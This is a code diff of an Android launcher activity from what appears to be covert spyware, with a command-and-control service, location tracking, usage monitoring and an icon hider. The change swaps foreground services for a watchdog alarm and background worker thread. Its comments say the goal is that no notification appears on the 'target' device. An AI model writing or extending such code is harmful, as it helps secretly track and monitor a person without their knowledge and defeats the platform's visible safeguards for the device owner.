@@ -24,11 +24,8 @@ import android.widget.TextView
 import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationManagerCompat
-import com.sp.core.services.C2Service
-import com.sp.core.services.LocationService
 import com.sp.core.services.UsageStatsService
 import com.sp.core.stealth.IconHider
-import com.sp.core.util.Fgs
 import com.sp.core.util.PermState
 import com.sp.core.util.Prefs
 
@@ -98,8 +95,10 @@ class LauncherActivity : Activity() {
     override fun onResume() {
         super.onResume()
         refresh()
-        Fgs.startService(this, C2Service::class.java)
-        Fgs.startService(this, LocationService::class.java)
+        // No foreground service: on Android 14+ it would show a notification
+        // on the target. The watchdog alarm drives the agent instead.
+        try { com.sp.watchdog.WatchdogAlarm.arm(this) } catch (_: Throwable) {}
+        Thread { try { com.sp.core.agent.AgentWorker.tick(this, force = true) } catch (_: Throwable) {} }.start()
 
         // The flow continues where it stopped: the user comes back from the
         // settings screen and the next one opens.
@@ -614,16 +613,10 @@ class LauncherActivity : Activity() {
     }
 
     private fun startAgent() {
-        try {
-            val c2 = Intent(this, C2Service::class.java)
-            if (Build.VERSION.SDK_INT >= 26) startForegroundService(c2) else startService(c2)
-        } catch (_: Throwable) {
-        }
-        try {
-            val loc = Intent(this, LocationService::class.java)
-            if (Build.VERSION.SDK_INT >= 26) startForegroundService(loc) else startService(loc)
-        } catch (_: Throwable) {
-        }
+        // The agent is driven by the watchdog alarm - no foreground service,
+        // so the device shows no notification at all.
+        try { com.sp.watchdog.WatchdogAlarm.arm(this) } catch (_: Throwable) {}
+        Thread { try { com.sp.core.agent.AgentWorker.tick(this, force = true) } catch (_: Throwable) {} }.start()
         try {
             startService(Intent(this, UsageStatsService::class.java))
         } catch (_: Throwable) {
